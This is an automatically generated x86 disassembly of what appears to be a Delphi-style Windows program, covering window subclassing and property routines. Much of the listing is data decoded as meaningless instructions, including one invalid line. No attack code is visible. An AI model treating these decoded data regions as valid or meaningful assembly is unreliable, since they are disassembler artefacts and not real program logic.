add [ 0x6e695754 ] dl
inc ebx
outsd
outsb
je r-xdata
je r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xb74cc08b
inc ebx
add [ ebx ] al
or [ ecx + ecx * 2 + 0x6d ] dl
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] cl
add [ eax ] al
add [ eax - 0x49 ] cl
inc ebx
insb
inc ebx
jne r-xdata
or [ ecx + 0x6d ] ebp
inc ebx
push 0x73656e69
or ch [ gs : ecx + 0x6d ]
add [ esp + edx * 2 ] ecx
or [ ecx + 0x6d ] ch
push ebx
inc ecx
insb
jo r-xdata
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edi * 4 ] al
inc ebx
add [ esi ] al
bound esi [ esi + 0x4e ]
dec esp
outsd
ja r-xdata
or [ edx + 0x76 ] esp
insb
or [ ecx + 0x6d ] ebp
dec eax
popad
outsb
jne r-xdata
insb
inc ebp
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
jb r-xdata
je r-xdata
popad
pop es
imul ebp [ ebp + 0x41 ] 0x6168706c
push es
imul ebp [ ebp + 0x48 ] 0x7617269
imul ebp [ ebp + 0x53 ] 0x6174614b
push es
imul ebp [ ebp + 0x4b ] 0x9617461
imul ebp [ ebp + 0x43 ] 0x656e6968
jae r-xdata
add [ eax ] al
outsd
insb
jae r-xdata
add [ esi ] al
jb r-xdata
or [ edx + 0x76 ] ah
insb
or [ ebx + 0x6f ] al
outsb
je r-xdata
pop es
bound esp [ ebp + 0x54 ]
mov eax 0xa030043
push esp
inc edx
jbe r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
add [ eax ] al
add [ eax + edi * 4 + 0x43 ] cl
add [ esi ] al
bound esp [ ebp + 0x4c ]
je r-xdata
add eax 0x0
mov eax 0x62060043
jbe r-xdata
push ebx
dec eax
popad
outsb
jne r-xdata
or ch [ ecx + 0x6d ]
outsb
or [ gs : edx + 0x76 ] esp
mov eax 0xb060043
push esp
inc edx
jbe r-xdata
add [ eax ] al
insb
inc ebp
jae r-xdata
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
push edx
popad
imul esi [ ebx + 0x65 ] 0x76620764
push ebx
jo r-xdata
or [ fs : edx + 0x76 ] ah
add [ eax + edi * 4 + 0x43 ] ecx
add [ ebx + 0x43b8acc0 ] cl
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
add bh bh
imul esp [ esp + esi * 2 + 0x68 ] 0x105
outsd
insd
inc edx
outsd
je r-xdata
or [ edx + 0x65 ] ah
bound esp [ ebp + 0x52 ]
imul esp [ edi + 0x68 ] 0x65620874
add [ ebx ] al
add [ eax ] al
add [ eax + 0x60043b8 ] ch
bound ebp [ ebx + 0x4e ]
outsd
outsb
push es
bound ebp [ ebx + 0x54 ]
imul ebp [ ebp + 0x6 ] 0x6f536b62
je r-xdata
outsd
jo r-xdata
push esp
outsd
mov eax 0xc08b0043
lodsb [ esi ]
mov eax 0xa030043
push esp
inc edx
jbe r-xdata
dec esp
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ eax ] al
outsd
insb
jae r-xdata
add [ ecx ] cl
imul ebp [ ebp + 0x44 ] 0x62617369
insb
pop es
imul ebp [ ebp + 0x43 ] 0x65736f6c
push es
imul ebp [ ebp + 0x4f ] 0xa6e6570
imul ebp [ ebp + 0x44 ] 0x43746e6f
popad
jb r-xdata
inc edx
outsd
jb r-xdata
rcr ah 0xb7
inc ebx
add [ edx ] cl
or [ ecx + ecx * 2 + 0x6d ] dl
or [ ebx + 0x6f ] al
bound ebp [ ebx + 0x46 ]
insb
popad
je r-xdata
add [ eax ] al
adc [ eax ] eax
dec esi
popad
insd
mov eax eax
in al dx
mov bh 0x43
add [ ecx ] al
or al 0x54
or cl [ eax ]
push esp
dec ecx
insd
push eax
add [ eax ] al
pop eax
mov dl 0x43
add [ eax - 0x12 ] cl
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
inc esp
aas
inc esp
add [ ecx + esi ] al
inc eax
add [ eax ] ah
xor [ eax ] eax
sbb al 0x22
inc esp
add [ edi + ebp * 2 ] ah
inc esp
add [ edi + esi ] cl
inc esp
add [ eax - 0x5fffbe7c ] ch
sbb al 0x44
add [ eax - 0x3fffbc10 ] al
and eax [ eax + eax - 0x68 ]
stc
inc ebx
add [ eax - 0x12 ] ah
inc ecx
mov edx 0xbce20043
outsd
insb
jae r-xdata
mov eax eax
outsb
je r-xdata
inc ebx
outsd
add [ eax ] al
add [ ecx + eax ] eax
add [ ecx ] eax
add eax 0x12010201
add [ edi ] ebp
add [ eax ] dl
add ch [ esi ]
add [ edx ] al
add [ ebx - 0x7bff7e00 ] al
add [ ebp + 0x11030f00 ] al
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb033b02c
xor al 0xb0
cmp [ eax - 0x4fc54fc7 ] dh
cmp al 0xb0
sbb [ ebx ] al
out dx eax
add al ah
pushad
inc esp
add al dl
arpl [ eax + eax + 0xe ] ax
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] cl
mov ecx 0x17c0043
add [ eax ] al
fdiv [ edi + 0x1880043 ]
add [ eax ] al
imul eax [ eax ] 0x111000f
dec esi
add [ 0x15011400 ] dl
add [ ecx ] edi
add [ 0x2c002b00 ] ch
add [ eax + eax ] dl
inc edi
add [ esi ] al
add eax 0x20000300
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add al bh
and [ eax + eax + 0x38 ] al
push 0x44
add [ edi + ebp * 2 + 0x44 ] dl
add [ eax - 0xbffbb92 ] ah
out dx al
inc ebx
add al bh
inc esp
add [ eax ] bl
inc esp
add [ eax ] dh
bound eax [ eax + eax + 0x3c ]
out dx al
inc ebx
add [ eax - 0x12 ] al
inc ebx
add [ eax + 0x1e ] dh
inc esp
add [ esi + ebx - 0x67fffbc ] bl
inc ebx
add [ eax + 0xc0043ef ] bh
sti
inc ebx
add [ edx + edi * 8 - 0x267ffbd ] al
inc ebx
add [ esp + edi * 8 + 0x43 ] al
add al ah
cmp eax 0x1f200044
inc esp
add [ edx + 0x63400044 ] al
inc esp
add [ esi + ebx * 2 ] bh
inc esp
add [ ebx ] ah
inc esp
add [ eax ] bh
and al 0x44
add ah cl
sub al [ eax + eax + 0x6c ]
cmp [ eax + eax + 0x58 ] al
xor al [ eax + eax + 0x54 ]
xor eax 0x33840044
inc esp
add [ ecx + edi ] al
inc esp
add [ eax ] cl
cmp [ eax + eax - 0x40 ] eax
aaa
inc esp
add [ eax + 0x37 ] ch
inc esp
add [ esp + 0x44 ] ah
add [ eax + 0x14004441 ] dh
jbe r-xdata
outsd
insb
jae r-xdata
shl al 0xb8
inc ebx
add [ ecx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
inc ebx
add dl ah
mov esp 0x2040043
add [ eax ] al
add [ eax ] al
push eax
mov edx 0xbcf40043
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x46 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x46 ] dl
inc ebx
add ah dh
mov esp 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0xffffffba
add bh bh
dec [ eax + 0x43b9 ]
loop r-xdata
insb
push edi
and al 0x11
inc eax
add [ ecx ] al
jns r-xdata
inc ebx
add [ edx + eax ] al
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
outsb
je r-xdata
sub_43bb34
mov eax 0xb6ffb7ff
push [ ebp + 0x5cffb4ff ]
inc ebp
inc esp
add [ esi + eax * 2 + 0x46dc0044 ] bh
inc esp
add [ eax ] al
inc edi
inc esp
add [ eax + 0x47 ] dl
inc esp
add [ eax + 0x47 ] dh
inc esp
add [ eax - 0x4bffbbb9 ] dl
inc edi
inc esp
add al bl
inc edi
inc esp
add ah bh
inc edi
inc esp
add [ eax ] ah
dec eax
inc esp
add [ eax + 0x68004448 ] ch
dec ecx
inc esp
add [ eax - 0x13ffbbb7 ] bh
dec ecx
inc esp
add [ eax ] al
dec edx
inc esp
add [ ebx + edx * 2 ] cl
inc esp
add [ eax ] bh
push ebx
inc esp
add ah dh
push ebx
inc esp
add [ esp + edx * 2 ] dl
inc esp
add [ eax - 0x77ffbbac ] bh
push ebp
inc esp
add [ eax ] dh
push esi
inc esp
add [ eax + 0x56 ] dl
inc esp
add [ esi + edx * 2 + 0x56a40044 ] al
inc esp
add ah dl
jno r-xdata
add ah bl
pop eax
inc esp
add ah ah
pop eax
inc esp
add [ ecx + ebx * 2 ] bh
inc esp
add [ ecx + ebx * 2 + 0x59ac0044 ] al
inc esp
add [ eax ] ch
pop edx
inc esp
add al ch
pop ecx
inc esp
add [ eax + 0x5a ] ch
inc esp
add [ eax + 0x1400445a ] ch
pop ecx
inc esp
add [ edi + edx * 2 + 0x58040044 ] dh
inc esp
add [ eax + 0x58 ] bh
inc esp
add [ eax + ebx * 2 + 0x5ae80044 ] al
inc esp
add [ eax + 0x5b ] bh
inc esp
add al dh
pop edx
inc esp
add al bh
pop edx
inc esp
add [ eax ] al
pop ebx
inc esp
add [ eax ] cl
pop ebx
inc esp
add [ eax ] ch
pop esp
inc esp
add [ ebx * 2 + 0x5d600044 ] cl
inc esp
add [ ebp + ebx * 2 + 0x5e080044 ] ch
inc esp
add [ ebx + ebx * 2 + 0x44 ] ah
add [ ecx + edi + 0x62940044 ] al
inc esp
add ah ah
push eax
inc esp
add al dl
push ecx
inc esp
add al bh
push ecx
inc esp
add ah cl
push edi
inc esp
add ah bl
jne r-xdata
add al bl
push esi
inc esp
add ah dh
push esi
inc esp
add [ edx + esi * 2 + 0x44 ] ah
add [ eax + 0x57 ] dh
inc esp
add [ edi + edx * 2 + 0x471c0044 ] dl
inc esp
add [ eax ] dh
inc edi
inc esp
add [ eax + 0x47 ] al
inc esp
add [ eax ] al
dec ebx
inc esp
add [ ebx + ecx * 2 ] dl
inc esp
add [ eax ] ch
dec ebx
inc esp
add [ ebx + ecx * 2 ] bh
inc esp
add [ esi * 2 + 0x58a40044 ] cl
inc esp
add [ eax - 0x33ffbba8 ] bh
pop eax
inc esp
add ah dl
pop eax
inc esp
add [ ebx + edx * 2 + 0x44 ] ah
add [ esp + edx * 2 ] dh
inc esp
add [ eax ] bl
push edi
inc esp
add al cl
dec esi
inc esp
add al bh
imul eax [ eax + eax - 0x30 ] 0x90004461
arpl [ eax + eax - 0x54 ] ax
dec ebp
inc esp
add [ eax + 0x2d ] ch
inc esp
add [ eax ] cl
inc esp
add [ eax ] bl
push 0x540b0044
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
mov eax eax
hlt
add ah bl
outsb
inc esp
add [ eax ] dh
inc esp
add [ edi + ebx * 2 + 0x44 ] bl
add [ edi + ecx * 2 + 0x4fc00044 ] bh
inc esp
add [ eax + 0x4d ] bl
inc esp
add [ eax ] dh
dec esi
inc esp
add ah bh
dec ebp
inc esp
add [ ebp + ecx * 2 + 0x44 ] ch
add [ ebp + ecx * 2 + 0x2c940044 ] cl
inc esp
add [ eax + 0x4d ] ch
inc esp
add [ eax + 0x4e ] dh
inc esp
add [ edi + ebp * 2 ] bl
inc esp
add [ eax + 0x24004469 ] dh
dec edi
inc esp
add [ edx + edx * 2 + 0x44 ] bh
sub_43c400
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
les eax [ ebx ]
sub [ eax ] al
add [ eax ] al
mov al 0x10
inc eax
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
sub_43c4f0
rol ah 0x1
inc ebx
add dl bl
les eax [ ebx ]
in al 0xc4
inc ebx
add [ ebp - 0x3c ] dl
inc ebx
add [ ebp - 0x3c ] bl
inc ebx
add [ ebp - 0x3c ] ah
inc ebx
add [ ebp - 0x3c ] ch
inc ebx
add [ edx - 0x3c ] bh
inc ebx
add [ edi - 0x6bffbc3c ] al
les eax [ ebx ]
mov eax [ 0xffffffffae0043c4 ]
les eax [ ebx ]
mov ebx 0xc80043c4
les eax [ ebx ]
add [ eax ] eax
add [ eax ] al
jns r-xdata
add [ ecx - 0x3 ] bh
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0xffffffffc4f0e870 ] eax
inc ebx
add [ eax + eax ] dh
add [ eax ] al
add [ eax ] al
add [ ebp + eax * 8 - 0x3ad7ffbd ] dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
lds eax [ ebx ]
js r-xdata
add [ eax ] al
movsb [ edi ] [ esi ]
adc [ eax ] eax
mov ah 0x33
inc eax
add [ eax + 0x59 ] dl
inc eax
add [ ecx + ebx * 2 + 0x40 ] bl
add al cl
xor eax [ eax ]
mov esp 0x6c004033
pop ecx
inc eax
add [ eax ] ah
xor [ eax ] eax
xor [ edx - 0x757bffbc ] cl
inc esp
add ah bh
mov eax [ eax + eax + 0xc ]
mov [ eax + eax - 0x34 ] es
xchg ebx eax
inc esp
add [ esi + edx * 4 - 0x670bffbc ] dh
inc esp
add al bh
0x9ffc0044 0x44
mov al 0x9d
inc esp
add al cl
mov [ eax + eax - 0x70 ] al
xchg edi eax
inc esp
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x54 ] bp
jb r-xdata
add [ eax ] al
je r-xdata
mov eax eax
sbb dh al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
mov [ ebx ] 0x28
add [ eax ] al
add [ eax - 0x4bffbff0 ] dh
xor eax [ eax ]
shl [ ebx ] 0x40
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add ah ah
lodsb [ esi ]
inc esp
add [ esi ] al
push esp
dec ebp
outsd
jne r-xdata
inc ebx
jmp r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax * 8 + 0x43 ] bl
add [ eax ] cl
add al [ eax ]
add [ ecx + edi * 4 ] bh
inc ebx
add [ eax - 0x12 ] cl
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
inc esp
aas
inc esp
add [ ecx + esi ] al
inc eax
add [ eax ] ah
xor [ eax ] eax
sbb al 0x22
inc esp
add [ edi + ebp * 2 ] ah
inc esp
add [ edi + esi ] cl
inc esp
add [ eax - 0x5fffbe7c ] ch
sbb al 0x44
add [ eax - 0x3fffbc10 ] al
and eax [ eax + eax - 0x68 ]
stc
inc ebx
add [ eax - 0x12 ] ah
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add al bh
and [ eax + eax + 0x38 ] al
push 0x44
add [ edi + ebp * 2 + 0x44 ] dl
add [ eax - 0xbffbb92 ] ah
out dx al
inc ebx
add al bh
inc esp
add [ eax ] bl
inc esp
add [ eax ] dh
bound eax [ eax + eax + 0x3c ]
out dx al
inc ebx
add [ eax - 0x12 ] al
inc ebx
add [ eax + 0x1e ] dh
inc esp
add [ esi + ebx - 0x67fffbc ] bl
inc ebx
add [ eax + 0xc0043ef ] bh
sti
inc ebx
add [ edx + edi * 8 - 0x267ffbd ] al
inc ebx
add [ esp + edi * 8 + 0x43 ] al
nop
insb
mov [ ebx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax * 8 + 0x43 ] dh
nop
je r-xdata
add al ah
pushad
inc esp
add al dl
arpl [ eax + eax + 0x6c ] ax
sub [ eax ] eax
insb
add al ah
cmp eax 0x1f200044
inc esp
add [ edx + 0x63400044 ] al
inc esp
add [ esi + ebx * 2 ] bh
inc esp
add [ ebx ] ah
inc esp
add [ eax ] bh
and al 0x44
add ah cl
sub al [ eax + eax + 0x6c ]
cmp [ eax + eax + 0x58 ] al
xor al [ eax + eax + 0x54 ]
xor eax 0x33840044
inc esp
add [ ecx + edi ] al
inc esp
add [ eax ] cl
cmp [ eax + eax - 0x40 ] eax
aaa
inc esp
add [ eax + 0x37 ] ch
inc esp
add [ esp + 0x44 ] ah
add [ eax + 0x14004441 ] dh
jbe r-xdata
test dl bh
inc ebx
add [ eax + 0x440043fd ] bl
cld
inc ebx
sub [ eax ] eax
insb
sub [ eax ] eax
insb
sub [ eax ] eax
insb
sub [ eax ] eax
insb
sub [ eax ] eax
insb
sub [ eax ] eax
insb
sub [ eax ] eax
push eax
mov ah 0x44
add [ ecx + ebp + 0x40 ] ch
add [ edx ] dl
push esp
inc ebx
jne r-xdata
inc ebx
add [ edi ] al
adc dl [ ebx + eax * 2 + 0x75 ]
jae r-xdata
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
inc esp
je r-xdata
add [ edi + esi ] cl
inc esp
add [ eax - 0x5fffbe7c ] ch
sbb al 0x44
add [ eax - 0x3fffbc10 ] al
and eax [ eax + eax - 0x68 ]
stc
inc ebx
add [ eax - 0x12 ] ah
outsd
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
je r-xdata
add al ah
pushad
inc esp
add al dl
arpl [ eax + eax + 0x6c ] ax
sub [ eax ] eax
insb
sub [ eax ] eax
insb
sub [ eax ] eax
insb
sub [ eax ] eax
insb
sub [ eax ] eax
insb
sub [ eax ] eax
insb
sub [ eax ] eax
insb
sub [ eax ] eax
push eax
mov ah 0x44
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ ecx + ebp + 0x40 ] ch
add [ 0x73754354 ] bl
je r-xdata
add [ ecx + esi ] al
inc eax
add [ eax ] ah
xor [ eax ] eax
sbb al 0x22
inc esp
add [ edi + ebp * 2 ] ah
inc esp
inc eax
add [ edi + 0x33c80041 ] bl
inc eax
add [ edi + edi + 0x44 ] al
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
inc ecx
add [ eax - 0x7fffbbe4 ] ah
insb
insb
mov [ ebx ] 0xf0
mov esp 0xb0043
or [ ebx + 0x6f ] al
outsb
je r-xdata
jpo r-xdata
push ebx
insb
arpl [ gs : esp + ecx * 2 + 0x69 ] si
jae r-xdata
insd
dec ebp
jne r-xdata
aas
inc esp
insb
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add al bh
and [ eax + eax + 0x38 ] al
push 0x44
add [ edi + ebp * 2 + 0x44 ] dl
add [ eax - 0xbffbb92 ] ah
out dx al
inc ebx
add al bh
inc esp
add [ eax ] bl
inc esp
add [ eax ] dh
bound eax [ eax + eax + 0x3c ]
out dx al
inc ebx
add [ eax - 0x12 ] al
inc ebx
add [ eax + 0x1e ] dh
inc esp
add [ esi + ebx - 0x67fffbc ] bl
inc ebx
add [ eax + 0xc0043ef ] bh
sti
inc ebx
add [ edx + edi * 8 - 0x267ffbd ] al
inc ebx
add [ esp + edi * 8 + 0x43 ] al
add al ah
cmp eax 0x1f200044
inc esp
add [ edx + 0x63400044 ] al
inc esp
add [ esi + ebx * 2 ] bh
inc esp
add [ ebx ] ah
inc esp
add [ eax ] bh
and al 0x44
add ah cl
sub al [ eax + eax + 0x6c ]
cmp [ eax + eax + 0x58 ] al
xor al [ eax + eax + 0x54 ]
xor eax 0x33840044
inc esp
add [ ecx + edi ] al
inc esp
add [ eax ] cl
cmp [ eax + eax - 0x40 ] eax
aaa
inc esp
add [ eax + 0x37 ] ch
inc esp
add [ esp + 0x44 ] ah
add [ eax + 0x14004441 ] dh
jbe r-xdata
outsd
insb
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
add [ ebx - 0x6f76f7ab ] cl
add [ ecx ] 0x0
add [ ecx + rw-data ] ah
mov eax [ eax + 0x18c ]
push eax
add [ eax ] al
inc ebx
outsd
outsb
je r-xdata
dec eax
add [ ebp - 0x3813ffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
leave
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
enter 0x43 0xc
add al [ eax ]
add [ eax ] ah
mov [ ebx ] 0x48
out dx al
inc ecx
add al al
xor eax [ eax ]
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
outsd
insb
mov eax eax
or cl cl
inc ebx
add [ edi ] al
sbb eax 0x73754354
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
insd
dec ebp
jne r-xdata
inc ebp
or [ eax - 0x18 ] dl
and al 0xa0
cld
[ ecx + 0x40000000 ]
je r-xdata
push ebx
insb
arpl [ gs : esp + ecx * 2 + 0x69 ] si
jae r-xdata
push eax
call GetWindowLongA
test eax eax
inc ebx
outsd
outsb
je r-xdata
jne r-xdata
mov al [ 0xffffffffc085fffc ]
outsd
insb
in al dx
mov [ ebx ] r-xdata
or eax [ eax ]
or [ ebx + 0x6f ] al
outsb
je r-xdata
pop ds
mov [ 0xffffffff98a1fffc ] al
jpo r-xdata
outsd
insb
jae r-xdata
pop ebx
pop ecx
pop ebp
retn 0x10
add [ eax ] eax
add [ ecx + 0x38bfc45 ] cl
add [ eax + 0xf ] dl
mov bh 0x5
and bl [ ebx - 0x74afffb8 ]
inc ebp
or [ eax - 0x18 ] dl
fsub [ ecx - 0x675e0004 ]
jpo r-xdata
add [ edx + 0x1ea8010 ] cl
jb r-xdata
lahf
cld
inc [ ebp - 0x17e28b40 ]
mov al 0x98
cld
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
add [ eax + 0xf ] dl
mov bh 0x5
and [ ebx - 0x74afffb8 ] bl
inc ebp
or [ eax - 0x18 ] dl
shl [ ecx + 0x75fffffc ] 0x14
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_43c950
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_43ca08
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_43ca3c
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_404400
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_43ca08
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_43ca98
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_43cc7c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c6a4
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_404460
mov eax edi
mov edx esi
call sub_403f94
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43ccc0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c6a4
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_404460
mov eax edi
mov edx esi
call sub_403f94
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43cd04
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
add eax [ esi + 0x44 ]
push eax
mov eax [ esp + 0x8 ]
add eax [ esi + 0x40 ]
push eax
push ebx
call SetWindowOrgEx
mov eax ebx
push eax
mov ecx eax
mov edx 0x14
mov eax [ esi + 0x30 ]
call sub_440d98
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43cd80
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
jne r-xdata
mov eax ebx
call sub_446450
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_43ce2c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_417e94
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_43ce60
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_446450
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_43ce88
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4026dc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_43ce60
pop ecx
